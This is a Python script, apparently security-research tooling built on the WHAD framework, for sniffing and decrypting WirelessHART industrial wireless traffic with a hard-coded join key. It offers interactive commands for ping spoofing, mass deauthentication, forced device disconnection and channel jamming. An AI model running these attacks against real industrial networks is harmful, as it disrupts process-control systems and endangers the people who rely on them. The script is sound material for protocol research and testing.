import sys
from time import sleep
from whad.device import WhadDevice
from whad.exceptions import WhadDeviceNotFound
from whad.wirelesshart.connector.sniffer import *
from whad.common.monitors.wireshark import WiresharkMonitor, PcapWriterMonitor


if __name__ == '__main__':
    #logging.basicConfig(level=logging.DEBUG) 
    if len(sys.argv) >= 3:
        # Retrieve target interface

        interface = sys.argv[1]
        channel = sys.argv[2]
        enable_hopping = sys.argv[3]
        logname = interface + "_" + str(channel) + ("_hopping" if enable_hopping == "on" else "_single")

        try:
            
            dev = WhadDevice.create(interface)
            # Instantiate a sniffer
            sniffer = Sniffer(dev, logname=logname)
            sniffer.channel = int(channel)
            sniffer.add_join_key(b"ABCDABCDABCDABCD")
            sniffer.decrypt = True
            sniffer.start()
            sleep(1)
            if enable_hopping == "on":
                print("Channel hopping enabled")
                sniffer.enable_hopping()
            sniffer.attach_callback(sniffer.process_packet)

            pcap=PcapWriterMonitor(logname+".pcap")
            pcap.attach(sniffer)
            pcap.start()

            while True:
                sleep(1)
                str = input("write \"spoof\" to respond to ping requests, \"ping\" to send a ping request or \"deauth\" to send a mass deauthetication or \"disconnect\" to send a disconnect device request or \"jamm\" to start jamming\n")
                try:
                    sniffer.print_decryptor()
                    match str:
                        case "ping":
                            str = input("write destination\n")
                            dst = int(str)
                            encrypted = sniffer.ping_request(dst)
                        case "deauth":
                            str = input("write destination\n")
                            dst = int(str)
                            str = input("write duration\n")
                            duration = int(str)
                            encrypted = sniffer.mass_de_authetication_packet(dst, duration)
                        case "disconnect":
                            str = input("write destination\n")
                            dst = int(str)
                            encrypted = sniffer.disconnect_device(dst)
                        case "jamm":
                            print("Jamm:",sniffer.jam())
                        case "spoof":
                            str = input("write destination\n")
                            dst = int(str)
                            sniffer.process_ping(dst)
                            print(f"adding {dst} to the spoofed list") 
                except ValueError :
                    print("value error")
                except MissingLink :
                    print("MISSING LINK")
                
            
            
        except (KeyboardInterrupt, SystemExit):
            #sniffer.superframes.print_table()
            pcap.stop()
            pcap.close()
            dev.close()
            

        except WhadDeviceNotFound:
            print('[e] Device not found')
            exit(1)
